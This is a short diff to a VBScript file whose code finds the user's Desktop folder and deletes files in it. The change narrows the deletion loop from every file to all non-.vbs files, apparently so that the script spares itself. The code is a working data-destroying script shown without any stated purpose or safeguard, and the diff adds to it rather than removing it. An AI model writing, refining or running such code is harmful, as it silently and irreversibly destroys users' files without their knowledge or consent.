@@ -9,9 +9,11 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 ' Get the Desktop folder
 Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))
 
-' Loop through each file in the Desktop folder and delete it
+' Loop through each file in the Desktop folder and delete non-VBS files
 For Each objFile In objFolder.Files
-    objFSO.DeleteFile(objFile)
+    If LCase(objFSO.GetExtensionName(objFile.Path)) <> "vbs" Then
+        objFSO.DeleteFile(objFile)
+    End If
 Next
 
 ' Release FileSystemObject resources
